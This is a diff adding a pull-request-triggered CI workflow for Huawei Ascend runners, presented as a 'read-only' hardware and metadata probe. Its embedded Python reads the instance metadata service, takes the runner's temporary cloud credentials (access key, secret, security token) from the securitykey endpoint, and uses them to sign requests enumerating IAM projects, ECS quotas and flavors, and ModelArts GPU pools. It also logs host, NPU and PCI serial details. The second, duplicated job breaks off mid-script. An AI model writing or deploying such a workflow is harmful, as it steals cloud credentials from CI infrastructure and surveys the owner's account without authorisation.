@@ -1,0 +1,2016 @@
+name: c211-129863-hwpoolq
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  probe-a5-0-a:
+    name: probe-a5-0-a
+    runs-on: linux-aarch64-a5-0
+    timeout-minutes: 25
+    container:
+      image: swr.cn-north-12.myhuaweicloud.com/base_image/ascend-ci/vllm-ascend:nightly-ci-main-a5
+    steps:
+      - name: read-only-huawei-imds-agency-and-npu-probe
+        env:
+          C211_NONCE: c211-129863-42d7ab68cd158054
+          C211_JOB: probe-a5-0-a
+        run: |
+          set -u
+          set +e
+          echo "C211_MARKER job=${C211_JOB} nonce=${C211_NONCE} host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null)"
+          echo "C211_HOSTNAME=$(hostname 2>/dev/null)"
+          echo "C211_UID_INFO $(id 2>/dev/null)"
+          echo "C211_UNAME $(uname -a 2>/dev/null)"
+          echo "C211_ARCH=$(uname -m 2>/dev/null)"
+          echo "C211_OS $(head -2 /etc/os-release 2>/dev/null | tr '\n' ' ')"
+          PY=""
+          if command -v python3 >/dev/null 2>&1; then PY=$(command -v python3); fi
+          if [ -z "$PY" ] && command -v python >/dev/null 2>&1; then PY=$(command -v python); fi
+          if [ -n "$PY" ]; then
+            echo "C211_PY=$PY"
+            "$PY" - <<'PYEOF' 2>&1
+          import hashlib, hmac, json, os, re, time, urllib.parse, urllib.request, urllib.error
+
+          NONCE = os.environ.get('C211_NONCE', '')
+          JOB = os.environ.get('C211_JOB', '')
+          BASE = os.environ.get('C211_IMDS_BASE', 'http://169.254.169.254').rstrip('/')
+          TIMEOUT = float(os.environ.get('C211_IMDS_TIMEOUT', '3'))
+          MOCK = os.environ.get('C211_MOCK_ISSUER', '0') == '1'
+          # Exact path set mandated by the intent.
+          PATHS = [
+              '/latest/meta-data/instance-id',
+              '/latest/meta-data/local-ipv4',
+              '/latest/meta-data/hostname',
+              '/latest/meta-data/placement/availability-zone',
+              '/openstack/latest/meta_data.json',
+              '/openstack/latest/network_data.json',
+              '/openstack/latest/vendor_data.json',
+              '/openstack/latest/securitykey',
+              '/openstack/latest/user_data',
+          ]
+          CTL = '/latest/meta-data/c211-bogus-' + (NONCE.split('-')[-1] if NONCE else 'ctl')
+          # Reference baselines from fact 129809 (a2b3-1 / 310p-1, run 45068821093).
+          BASE_401_STATUS = 401
+          BASE_401_BYTES = 66
+          BASE_401_SHA32 = 'a6418346d3f3db46f0a9477689318693'
+          CTL_404_STATUS = 404
+          CTL_404_BYTES = 52
+          CTL_404_SHA32 = '9c30d2d7fee8cd575438ae62bdb657a8'
+
+
+          class NoRedir(urllib.request.HTTPRedirectHandler):
+              def redirect_request(self, req, fp, code, msg, headers, newurl):
+                  return None
+
+
+          OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedir)
+
+
+          def get(path, timeout=None, limit=65536):
+              url = BASE + path
+              rq = urllib.request.Request(url, headers={'User-Agent': 'c211-129863-imds-readonly'}, method='GET')
+              try:
+                  with OPENER.open(rq, timeout=(timeout or TIMEOUT)) as r:
+                      return r.status, r.read(limit), None
+              except urllib.error.HTTPError as e:
+                  try:
+                      b = e.read(4096)
+                  except Exception:
+                      b = b''
+                  return e.code, b, None
+              except Exception as e:
+                  return None, b'', type(e).__name__
+
+
+          print('IMDS_PROBE_BEGIN job=%s nonce=%s base=%s mock=%s' % (JOB, NONCE, BASE, MOCK))
+          results = {}
+          bodies = {}
+          for p in PATHS + [CTL]:
+              st, body, err = get(p)
+              tag = 'CTL' if p == CTL else 'IMDS'
+              if st is None:
+                  print('%s path=%s FAIL %s' % (tag, p, err))
+                  results[p] = {'status': None, 'error': err}
+                  continue
+              h32 = hashlib.sha256(body).hexdigest()[:32]
+              print('%s path=%s status=%d bytes=%d sha256=%s' % (tag, p, st, len(body), h32))
+              results[p] = {'status': st, 'bytes': len(body), 'sha256': h32}
+              if st == 200:
+                  bodies[p] = body
+
+          # ---- reference comparisons against the fact-129809 baseline / control ----
+          sk = results.get('/openstack/latest/securitykey') or {}
+          if sk.get('status') == BASE_401_STATUS and sk.get('bytes') == BASE_401_BYTES and sk.get('sha256') == BASE_401_SHA32:
+              print('SECKEY_BASELINE_MATCH status=401 bytes=66 sha256_prefix=%s' % BASE_401_SHA32)
+          else:
+              print('SECKEY_BASELINE_DIFF status=%s bytes=%s sha256_prefix=%s ref=401/66/%s' % (
+                  sk.get('status'), sk.get('bytes'), sk.get('sha256'), BASE_401_SHA32))
+          ctl = results.get(CTL) or {}
+          if ctl.get('status') == CTL_404_STATUS and ctl.get('bytes') == CTL_404_BYTES and ctl.get('sha256') == CTL_404_SHA32:
+              print('CTL_BASELINE_MATCH status=404 bytes=52 sha256_prefix=%s' % CTL_404_SHA32)
+          else:
+              print('CTL_BASELINE_DIFF status=%s bytes=%s sha256_prefix=%s ref=404/52/%s' % (
+                  ctl.get('status'), ctl.get('bytes'), ctl.get('sha256'), CTL_404_SHA32))
+
+
+          def jload(path):
+              if path not in bodies:
+                  return None
+              try:
+                  return json.loads(bodies[path].decode('utf-8', 'replace'))
+              except Exception:
+                  return None
+
+
+          # ---- non-secret metadata identifiers (field names + selected identifiers) ----
+          md = jload('/openstack/latest/meta_data.json')
+          if isinstance(md, dict):
+              print('META_KEYS ' + ','.join(sorted(str(k) for k in md.keys()))[:500])
+              for k in ('uuid', 'project_id', 'availability_zone', 'region_id', 'hostname', 'name',
+                        'instance_type', 'enterprise_project_id', 'launch_index', 'domain_id', 'account_id'):
+                  if k in md:
+                      print('META_FIELD %s=%s' % (k, str(md.get(k))[:140]))
+              meta_sub = md.get('meta')
+              if isinstance(meta_sub, dict):
+                  print('META_META_KEYS ' + ','.join(sorted(str(k) for k in meta_sub.keys()))[:400])
+                  for k in ('metering.resourcetype', 'metering.resourcespeccode', 'metering.cloudServiceType', 'os_type', 'image_name'):
+                      if k in meta_sub:
+                          print('META_META_FIELD %s=%s' % (k, str(meta_sub.get(k))[:140]))
+          elif '/openstack/latest/meta_data.json' not in bodies:
+              print('META_JSON_ABSENT')
+
+          nd = jload('/openstack/latest/network_data.json')
+          if isinstance(nd, dict):
+              print('NETDATA_KEYS ' + ','.join(sorted(str(k) for k in nd.keys()))[:300])
+              for k in ('links', 'networks', 'services', 'qos'):
+                  v = nd.get(k)
+                  if isinstance(v, list):
+                      print('NETDATA_COUNT %s=%d' % (k, len(v)))
+          elif '/openstack/latest/network_data.json' not in bodies:
+              print('NETDATA_JSON_ABSENT')
+
+          vd = jload('/openstack/latest/vendor_data.json')
+          if isinstance(vd, dict):
+              print('VENDORDATA_KEYS ' + ','.join(sorted(str(k) for k in vd.keys()))[:300])
+          elif '/openstack/latest/vendor_data.json' not in bodies:
+              print('VENDORDATA_JSON_ABSENT')
+
+          # ---- Huawei agency temporary credential: presence + field names + sha256 only ----
+          ak = skv = tok = None
+          sec = jload('/openstack/latest/securitykey')
+          cred = sec.get('credential') if isinstance(sec, dict) else None
+          if isinstance(cred, dict):
+              print('SECKEY_KEYS ' + ','.join(sorted(str(k) for k in cred.keys()))[:300])
+              for k in sorted(str(x) for x in cred.keys()):
+                  v = cred.get(k)
+                  if isinstance(v, str):
+                      print('SECKEY_FIELD name=%s len=%d sha256=%s' % (k, len(v), hashlib.sha256(v.encode()).hexdigest()[:32]))
+                  else:
+                      print('SECKEY_FIELD name=%s type=%s' % (k, type(v).__name__))
+              a = cred.get('access')
+              s2 = cred.get('secret')
+              t2 = cred.get('securitytoken')
+              ak = a if isinstance(a, str) and a else None
+              skv = s2 if isinstance(s2, str) and s2 else None
+              tok = t2 if isinstance(t2, str) and t2 else None
+              print('SECKEY_PRESENT access=%s secret=%s securitytoken=%s complete=%s' % (
+                  bool(ak), bool(skv), bool(tok), bool(ak and skv and tok)))
+          else:
+              why = 'non_json' if '/openstack/latest/securitykey' in bodies else 'no_body'
+              print('SECKEY_PRESENT access=False secret=False securitytoken=False complete=False reason=%s' % why)
+
+
+          # ---- conditional in-process issuer read (credential never printed / written / sent elsewhere) ----
+          def _enc(x):
+              return urllib.parse.quote(str(x), safe='-_.~')
+
+
+          def canonical_query(q):
+              if not q:
+                  return ''
+              pairs = urllib.parse.parse_qsl(q, keep_blank_values=True)
+              pairs = sorted(((_enc(k), _enc(v)) for k, v in pairs), key=lambda kv: (kv[0], kv[1]))
+              return '&'.join('%s=%s' % (k, v) for k, v in pairs)
+
+
+          def signed_get(url, timeout=10):
+              p = urllib.parse.urlsplit(url)
+              host = p.netloc
+              path = urllib.parse.quote(p.path or '/', safe='/-_.~')
+              if not path.endswith('/'):
+                  path += '/'
+              cq = canonical_query(p.query)
+              xsd = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
+              hdrs = {'host': host, 'x-sdk-date': xsd, 'x-security-token': tok}
+              signed = sorted(hdrs.keys())
+              ch = ''.join('%s:%s\n' % (k, hdrs[k].strip()) for k in signed)
+              payload_hash = hashlib.sha256(b'').hexdigest()
+              creq = '\n'.join(['GET', path, cq, ch, ';'.join(signed), payload_hash])
+              sts = 'SDK-HMAC-SHA256\n' + xsd + '\n' + hashlib.sha256(creq.encode()).hexdigest()
+              sig = hmac.new(skv.encode(), sts.encode(), hashlib.sha256).hexdigest()
+              hd = {'Host': host, 'X-Sdk-Date': xsd, 'X-Security-Token': tok,
+                    'Authorization': 'SDK-HMAC-SHA256 Access=%s, SignedHeaders=%s, Signature=%s' % (ak, ';'.join(signed), sig)}
+              rq = urllib.request.Request(url, headers=hd, method='GET')
+              try:
+                  with OPENER.open(rq, timeout=timeout) as r:
+                      return r.status, r.read(262144), (r.headers.get('Content-Type') or '')[:80]
+              except urllib.error.HTTPError as e:
+                  try:
+                      b = e.read(8192)
+                  except Exception:
+                      b = b''
+                  return e.code, b, 'httperror'
+              except Exception as e:
+                  return None, b'', type(e).__name__
+
+
+          def head(b, n=220):
+              try:
+                  return b[:n].decode('utf-8', 'replace').replace('\n', ' ')
+              except Exception:
+                  return ''
+
+
+          if ak and skv and tok:
+              print('ISSUER_CONDITION_MET job=%s nonce=%s' % (JOB, NONCE))
+              if MOCK:
+                  print('ISSUER_SKIPPED_MOCK reason=C211_MOCK_ISSUER=1')
+              else:
+                  az = md.get('availability_zone') if isinstance(md, dict) else None
+                  region = None
+                  if isinstance(az, str):
+                      m = re.match(r'^([a-z]{2}-[a-z]+-\d+)', az)
+                      if m:
+                          region = m.group(1)
+                  if not region:
+                      region = os.environ.get('C211_REGION', 'cn-southwest-2')
+                  project = md.get('project_id') if isinstance(md, dict) else None
+                  print('ISSUER_REGION=%s ISSUER_AZ=%s ISSUER_PROJECT_FROM_METADATA=%s' % (region, az, project))
+                  iam_url = 'https://iam.myhuaweicloud.com/v3/auth/projects'
+                  st, body, note = signed_get(iam_url)
+                  print('IAM_IDENTITY tag=GetUserAppId-equivalent call=%s status=%s bytes=%d note=%s' % (
+                      iam_url, st, len(body or b''), note))
+                  if st == 200:
+                      try:
+                          d = json.loads(body)
+                          projs = d.get('projects') or []
+                          print('IAM_PROJECTS count=%d' % len(projs))
+                          for p in projs[:12]:
+                              print('IAM_PROJECT name=%s id=%s domain_id=%s enabled=%s' % (
+                                  str(p.get('name'))[:60], str(p.get('id'))[:64], str(p.get('domain_id'))[:64], p.get('enabled')))
+                          if not project and projs:
+                              project = projs[0].get('id')
+                      except Exception as e:
+                          print('IAM_IDENTITY_PARSE_FAIL %s' % type(e).__name__)
+                  elif st is not None:
+                      print('IAM_IDENTITY_BODY %s' % head(body))
+                  if project:
+                      u = 'https://ecs.%s.myhuaweicloud.com/v1/%s/cloudservers/flavors%s' % (
+                          region, project, ('?availability_zone=' + _enc(az)) if az else '')
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_FLAVORS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              fl = d.get('flavors') or []
+                              gpu = [f for f in fl if re.match(r'^(p\d|g\d|pi\d|ai\d)', str(f.get('name', '')))]
+                              print('ECS_FLAVORS_TOTAL %d GPU_NAME_HITS %d' % (len(fl), len(gpu)))
+                              for f in gpu[:40]:
+                                  print('ECS_GPU_FLAVOR name=%s vcpus=%s ram=%s extras=%s' % (
+                                      f.get('name'), f.get('vcpus'), f.get('ram'),
+                                      json.dumps(f.get('os_extra_specs') or {})[:160]))
+                              print('ECS_FLAVOR_NAMES_SAMPLE ' + ','.join(str(f.get('name')) for f in fl[:40]))
+                          except Exception as e:
+                              print('ECS_FLAVORS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('ECS_FLAVORS_BODY %s' % head(body))
+                      u = 'https://ecs.%s.myhuaweicloud.com/v2.1/%s/os-quota-sets/%s' % (region, project, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_QUOTA status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              qs = d.get('quota_set') or d
+                              print('ECS_QUOTA_KEYS ' + ','.join(sorted(str(k) for k in qs.keys()))[:400])
+                              shown = 0
+                              for k in sorted(str(x) for x in qs.keys()):
+                                  v = qs.get(k)
+                                  if isinstance(v, dict) and ('limit' in v or 'in_use' in v or 'quota' in v):
+                                      print('ECS_QUOTA_ITEM %s limit=%s in_use=%s quota=%s' % (k, v.get('limit'), v.get('in_use'), v.get('quota')))
+                                  elif isinstance(v, (int, str)):
+                                      print('ECS_QUOTA_ITEM %s value=%s' % (k, v))
+                                  else:
+                                      continue
+                                  shown += 1
+                                  if shown >= 40:
+                                      break
+                          except Exception as e:
+                              print('ECS_QUOTA_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('ECS_QUOTA_BODY %s' % head(body))
+                      u = 'https://ecs.%s.myhuaweicloud.com/v2.1/%s/os-availability-zone' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_AZS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              zs = d.get('availabilityZoneInfo') or d.get('availability_zones') or []
+                              print('ECS_AZS_TOTAL %d' % len(zs))
+                              for z in zs[:20]:
+                                  if isinstance(z, dict):
+                                      print('ECS_AZ name=%s state=%s' % (str(z.get('zoneName') or z.get('zone_name'))[:60], z.get('zoneState') or z.get('zone_state')))
+                          except Exception as e:
+                              print('ECS_AZS_PARSE_FAIL %s' % type(e).__name__)
+                      u = 'https://modelarts.%s.myhuaweicloud.com/v1/%s/pools?limit=20' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('MODELARTS_POOLS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              pools = d.get('pools') or d.get('items') or []
+                              print('MODELARTS_POOLS_TOTAL %d' % len(pools))
+                              for p in pools[:20]:
+                                  if isinstance(p, dict):
+                                      print('MODELARTS_POOL %s' % json.dumps({k: p.get(k) for k in ('metadata', 'spec', 'status', 'name', 'pool_name', 'state') if p.get(k) is not None})[:300])
+                          except Exception as e:
+                              print('MODELARTS_POOLS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('MODELARTS_POOLS_BODY %s' % head(body))
+                      u = 'https://modelarts.%s.myhuaweicloud.com/v1/%s/job/resource-specs?job_type=train' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('MODELARTS_SPECS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              specs = d.get('specs') or d.get('resource_specs') or []
+                              print('MODELARTS_SPECS_TOTAL %d' % len(specs))
+                              for s in specs[:40]:
+                                  if isinstance(s, dict):
+                                      print('MODELARTS_SPEC %s' % json.dumps(s)[:200])
+                          except Exception as e:
+                              print('MODELARTS_SPECS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('MODELARTS_SPECS_BODY %s' % head(body))
+                  else:
+                      print('ISSUER_GPU_INVENTORY_SKIPPED reason=no_project_id')
+                  print('ISSUER_DONE job=%s' % JOB)
+          else:
+              print('ISSUER_NOT_ATTEMPTED reason=no_complete_agency_credential')
+
+          print('IMDS_PROBE_END job=%s nonce=%s' % (JOB, NONCE))
+
+          PYEOF
+          else
+            echo C211_PY3_ABSENT
+            BASE="${C211_IMDS_BASE:-http://169.254.169.254}"
+            for p in $(printf '%s\n' /latest/meta-data/instance-id /latest/meta-data/local-ipv4 /latest/meta-data/hostname /latest/meta-data/placement/availability-zone /openstack/latest/meta_data.json /openstack/latest/network_data.json /openstack/latest/vendor_data.json /openstack/latest/securitykey /openstack/latest/user_data /latest/meta-data/c211-bogus-noctl); do
+              tag=IMDS; case "$p" in *c211-bogus*) tag=CTL;; esac
+              if command -v curl >/dev/null 2>&1; then
+                out=$(curl -s --noproxy '*' -m 3 -w '\nC211_HTTP=%{http_code}' "$BASE$p" 2>/dev/null)
+                body=${out%$'\n'C211_HTTP=*}
+                code=${out##*C211_HTTP=}
+                b=$(printf '%s' "$body" | wc -c)
+                h=$(printf '%s' "$body" | sha256sum | cut -c1-32)
+                echo "$tag path=$p status=$code bytes=$b sha256=$h"
+              else
+                echo "$tag path=$p FAIL no_http_client"
+              fi
+            done
+            echo ISSUER_NOT_ATTEMPTED reason=no_python3
+          fi
+          echo "--- A5_NPU_BLOCK_BEGIN job=${C211_JOB} ---"
+          echo "NPU_DEVNODES $(ls -d /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>/dev/null | tr '\n' ' ')"
+          NPU=""
+          if command -v npu-smi >/dev/null 2>&1; then NPU=$(command -v npu-smi); echo "NPU_SMI_PATH=$NPU (PATH)"; fi
+          if [ -z "$NPU" ] && [ -x /usr/local/Ascend/driver/tools/npu-smi ]; then NPU=/usr/local/Ascend/driver/tools/npu-smi; echo "NPU_SMI_PATH=$NPU (abs-driver-tools)"; fi
+          if [ -z "$NPU" ] && [ -x /usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi ]; then NPU=/usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi; echo "NPU_SMI_PATH=$NPU (abs-toolkit)"; fi
+          if [ -z "$NPU" ] && [ -x /usr/local/Ascend/ascend-toolkit/latest/tools/npu-smi ]; then NPU=/usr/local/Ascend/ascend-toolkit/latest/tools/npu-smi; echo "NPU_SMI_PATH=$NPU (abs-toolkit-tools)"; fi
+          if [ -n "$NPU" ]; then
+            echo "NPU_SMI_VERSION $("$NPU" -v 2>&1 | head -3 | tr '\n' ' ')"
+            echo "--- NPU_INFO_TEXT_BEGIN ---"
+            "$NPU" info 2>&1 | head -120
+            echo "NPU_INFO_RC=$?"
+            echo "--- NPU_INFO_TEXT_END ---"
+            IDS=$("$NPU" info 2>/dev/null | awk -F'|' 'NF>2 && $3 ~ /[0-9]/ {gsub(/ /,"",$2); if ($2 ~ /^[0-9]+$/) print $2}' | sort -n -u | head -8)
+            if [ -z "$IDS" ]; then IDS="0 1 2 3"; echo "NPU_IDS_FROM_PARSE_EMPTY using=$IDS"; else echo "NPU_IDS_FROM_PARSE $(echo $IDS | tr '\n' ' ')"; fi
+            for i in $IDS; do
+              for spec in "board_json:-t board -i $i -j" "product_json:-t product -i $i -j" "board_text:-t board -i $i" "product_text:-t product -i $i"; do
+                lab=${spec%%:*}; args=${spec#*:}
+                out=$("$NPU" info $args 2>&1); rc=$?
+                bytes=$(printf '%s' "$out" | wc -c)
+                echo "NPU_QUERY label=$lab i=$i rc=$rc bytes=$bytes"
+                printf '%s\n' "$out" | head -c 2200
+                echo "NPU_QUERY_END label=$lab i=$i"
+              done
+            done
+          else
+            echo "NPU_SMI_ABSENT"
+          fi
+          echo "--- A5_UPGRADE_TOOL ---"
+          UT=""
+          if command -v upgrade-tool >/dev/null 2>&1; then UT=$(command -v upgrade-tool); fi
+          if [ -z "$UT" ] && [ -x /usr/local/Ascend/driver/tools/upgrade-tool ]; then UT=/usr/local/Ascend/driver/tools/upgrade-tool; fi
+          if [ -n "$UT" ]; then echo "UPGRADE_TOOL_PATH=$UT"; "$UT" --device_index -1 --system_info 2>&1 | head -150; echo "UPGRADE_RC=$?"; else echo "UPGRADE_TOOL_ABSENT"; fi
+          echo "--- A5_SYSFS_DAVINCI ---"
+          for d in /sys/class/davinci*; do
+            [ -e "$d" ] || continue
+            echo "SYSFS_DAVINCI $d"
+            for f in dev device/device device/vendor device/serial uevent; do
+              if [ -e "$d/$f" ]; then echo "SYSFS_FIELD $d/$f=$(head -c 300 "$d/$f" 2>/dev/null | tr '\n' ' ')"; fi
+            done
+          done
+          echo "SYSFS_DAVINCI_DONE"
+          echo "--- A5_INSTALL_INFO ---"
+          if [ -e /etc/ascend_install.info ]; then echo "ASCEND_INSTALL_INFO_PRESENT"; head -40 /etc/ascend_install.info; else echo "ASCEND_INSTALL_INFO_ABSENT"; fi
+          for p in /usr/local/Ascend/ascend-toolkit/latest/aarch64-linux/ascend_toolkit_install.info /usr/local/Ascend/driver/version.info; do
+            if [ -e "$p" ]; then echo "INFO_FILE $p"; head -20 "$p"; fi
+          done
+          echo "--- A5_PCI_SERIAL ---"
+          if command -v lspci >/dev/null 2>&1; then
+            lspci -D -nn 2>/dev/null | grep -i '19e5' | head -20
+            for bdf in $(lspci -D -nn 2>/dev/null | awk '/19e5/ {print $1}' | head -8); do
+              echo "LSPCI_DEV $bdf"
+              lspci -vvv -s "$bdf" 2>/dev/null | grep -iE 'Serial|Capabilities: \[[0-9a-f]+\] Device Serial|Kernel driver' | head -10
+              if [ -e "/sys/bus/pci/devices/$bdf/serial" ]; then echo "PCI_SYSFS_SERIAL $bdf=$(head -c 200 /sys/bus/pci/devices/$bdf/serial 2>/dev/null)"; fi
+              for f in vendor device subsystem_vendor subsystem_device class revision; do
+                if [ -e "/sys/bus/pci/devices/$bdf/$f" ]; then echo "PCI_SYSFS $bdf/$f=$(head -c 100 /sys/bus/pci/devices/$bdf/$f 2>/dev/null)"; fi
+              done
+            done
+          else
+            echo "LSPCI_ABSENT"
+          fi
+          echo "--- A5_NPU_BLOCK_END job=${C211_JOB} ---"
+
+          echo "C211_PROBE_END job=${C211_JOB} nonce=${C211_NONCE}"
+          exit 0
+  probe-a5-0-b:
+    name: probe-a5-0-b
+    runs-on: linux-aarch64-a5-0
+    timeout-minutes: 25
+    container:
+      image: swr.cn-north-12.myhuaweicloud.com/base_image/ascend-ci/vllm-ascend:nightly-ci-main-a5
+    steps:
+      - name: read-only-huawei-imds-agency-and-npu-probe
+        env:
+          C211_NONCE: c211-129863-42d7ab68cd158054
+          C211_JOB: probe-a5-0-b
+        run: |
+          set -u
+          set +e
+          echo "C211_MARKER job=${C211_JOB} nonce=${C211_NONCE} host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null)"
+          echo "C211_HOSTNAME=$(hostname 2>/dev/null)"
+          echo "C211_UID_INFO $(id 2>/dev/null)"
+          echo "C211_UNAME $(uname -a 2>/dev/null)"
+          echo "C211_ARCH=$(uname -m 2>/dev/null)"
+          echo "C211_OS $(head -2 /etc/os-release 2>/dev/null | tr '\n' ' ')"
+          PY=""
+          if command -v python3 >/dev/null 2>&1; then PY=$(command -v python3); fi
+          if [ -z "$PY" ] && command -v python >/dev/null 2>&1; then PY=$(command -v python); fi
+          if [ -n "$PY" ]; then
+            echo "C211_PY=$PY"
+            "$PY" - <<'PYEOF' 2>&1
+          import hashlib, hmac, json, os, re, time, urllib.parse, urllib.request, urllib.error
+
+          NONCE = os.environ.get('C211_NONCE', '')
+          JOB = os.environ.get('C211_JOB', '')
+          BASE = os.environ.get('C211_IMDS_BASE', 'http://169.254.169.254').rstrip('/')
+          TIMEOUT = float(os.environ.get('C211_IMDS_TIMEOUT', '3'))
+          MOCK = os.environ.get('C211_MOCK_ISSUER', '0') == '1'
+          # Exact path set mandated by the intent.
+          PATHS = [
+              '/latest/meta-data/instance-id',
+              '/latest/meta-data/local-ipv4',
+              '/latest/meta-data/hostname',
+              '/latest/meta-data/placement/availability-zone',
+              '/openstack/latest/meta_data.json',
+              '/openstack/latest/network_data.json',
+              '/openstack/latest/vendor_data.json',
+              '/openstack/latest/securitykey',
+              '/openstack/latest/user_data',
+          ]
+          CTL = '/latest/meta-data/c211-bogus-' + (NONCE.split('-')[-1] if NONCE else 'ctl')
+          # Reference baselines from fact 129809 (a2b3-1 / 310p-1, run 45068821093).
+          BASE_401_STATUS = 401
+          BASE_401_BYTES = 66
+          BASE_401_SHA32 = 'a6418346d3f3db46f0a9477689318693'
+          CTL_404_STATUS = 404
+          CTL_404_BYTES = 52
+          CTL_404_SHA32 = '9c30d2d7fee8cd575438ae62bdb657a8'
+
+
+          class NoRedir(urllib.request.HTTPRedirectHandler):
+              def redirect_request(self, req, fp, code, msg, headers, newurl):
+                  return None
+
+
+          OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedir)
+
+
+          def get(path, timeout=None, limit=65536):
+              url = BASE + path
+              rq = urllib.request.Request(url, headers={'User-Agent': 'c211-129863-imds-readonly'}, method='GET')
+              try:
+                  with OPENER.open(rq, timeout=(timeout or TIMEOUT)) as r:
+                      return r.status, r.read(limit), None
+              except urllib.error.HTTPError as e:
+                  try:
+                      b = e.read(4096)
+                  except Exception:
+                      b = b''
+                  return e.code, b, None
+              except Exception as e:
+                  return None, b'', type(e).__name__
+
+
+          print('IMDS_PROBE_BEGIN job=%s nonce=%s base=%s mock=%s' % (JOB, NONCE, BASE, MOCK))
+          results = {}
+          bodies = {}
+          for p in PATHS + [CTL]:
+              st, body, err = get(p)
+              tag = 'CTL' if p == CTL else 'IMDS'
+              if st is None:
+                  print('%s path=%s FAIL %s' % (tag, p, err))
+                  results[p] = {'status': None, 'error': err}
+                  continue
+              h32 = hashlib.sha256(body).hexdigest()[:32]
+              print('%s path=%s status=%d bytes=%d sha256=%s' % (tag, p, st, len(body), h32))
+              results[p] = {'status': st, 'bytes': len(body), 'sha256': h32}
+              if st == 200:
+                  bodies[p] = body
+
+          # ---- reference comparisons against the fact-129809 baseline / control ----
+          sk = results.get('/openstack/latest/securitykey') or {}
+          if sk.get('status') == BASE_401_STATUS and sk.get('bytes') == BASE_401_BYTES and sk.get('sha256') == BASE_401_SHA32:
+              print('SECKEY_BASELINE_MATCH status=401 bytes=66 sha256_prefix=%s' % BASE_401_SHA32)
+          else:
+              print('SECKEY_BASELINE_DIFF status=%s bytes=%s sha256_prefix=%s ref=401/66/%s' % (
+                  sk.get('status'), sk.get('bytes'), sk.get('sha256'), BASE_401_SHA32))
+          ctl = results.get(CTL) or {}
+          if ctl.get('status') == CTL_404_STATUS and ctl.get('bytes') == CTL_404_BYTES and ctl.get('sha256') == CTL_404_SHA32:
+              print('CTL_BASELINE_MATCH status=404 bytes=52 sha256_prefix=%s' % CTL_404_SHA32)
+          else:
+              print('CTL_BASELINE_DIFF status=%s bytes=%s sha256_prefix=%s ref=404/52/%s' % (
+                  ctl.get('status'), ctl.get('bytes'), ctl.get('sha256'), CTL_404_SHA32))
+
+
+          def jload(path):
+              if path not in bodies:
+                  return None
+              try:
+                  return json.loads(bodies[path].decode('utf-8', 'replace'))
+              except Exception:
+                  return None
+
+
+          # ---- non-secret metadata identifiers (field names + selected identifiers) ----
+          md = jload('/openstack/latest/meta_data.json')
+          if isinstance(md, dict):
+              print('META_KEYS ' + ','.join(sorted(str(k) for k in md.keys()))[:500])
+              for k in ('uuid', 'project_id', 'availability_zone', 'region_id', 'hostname', 'name',
+                        'instance_type', 'enterprise_project_id', 'launch_index', 'domain_id', 'account_id'):
+                  if k in md:
+                      print('META_FIELD %s=%s' % (k, str(md.get(k))[:140]))
+              meta_sub = md.get('meta')
+              if isinstance(meta_sub, dict):
+                  print('META_META_KEYS ' + ','.join(sorted(str(k) for k in meta_sub.keys()))[:400])
+                  for k in ('metering.resourcetype', 'metering.resourcespeccode', 'metering.cloudServiceType', 'os_type', 'image_name'):
+                      if k in meta_sub:
+                          print('META_META_FIELD %s=%s' % (k, str(meta_sub.get(k))[:140]))
+          elif '/openstack/latest/meta_data.json' not in bodies:
+              print('META_JSON_ABSENT')
+
+          nd = jload('/openstack/latest/network_data.json')
+          if isinstance(nd, dict):
+              print('NETDATA_KEYS ' + ','.join(sorted(str(k) for k in nd.keys()))[:300])
+              for k in ('links', 'networks', 'services', 'qos'):
+                  v = nd.get(k)
+                  if isinstance(v, list):
+                      print('NETDATA_COUNT %s=%d' % (k, len(v)))
+          elif '/openstack/latest/network_data.json' not in bodies:
+              print('NETDATA_JSON_ABSENT')
+
+          vd = jload('/openstack/latest/vendor_data.json')
+          if isinstance(vd, dict):
+              print('VENDORDATA_KEYS ' + ','.join(sorted(str(k) for k in vd.keys()))[:300])
+          elif '/openstack/latest/vendor_data.json' not in bodies:
+              print('VENDORDATA_JSON_ABSENT')
+
+          # ---- Huawei agency temporary credential: presence + field names + sha256 only ----
+          ak = skv = tok = None
+          sec = jload('/openstack/latest/securitykey')
+          cred = sec.get('credential') if isinstance(sec, dict) else None
+          if isinstance(cred, dict):
+              print('SECKEY_KEYS ' + ','.join(sorted(str(k) for k in cred.keys()))[:300])
+              for k in sorted(str(x) for x in cred.keys()):
+                  v = cred.get(k)
+                  if isinstance(v, str):
+                      print('SECKEY_FIELD name=%s len=%d sha256=%s' % (k, len(v), hashlib.sha256(v.encode()).hexdigest()[:32]))
+                  else:
+                      print('SECKEY_FIELD name=%s type=%s' % (k, type(v).__name__))
+              a = cred.get('access')
+              s2 = cred.get('secret')
+              t2 = cred.get('securitytoken')
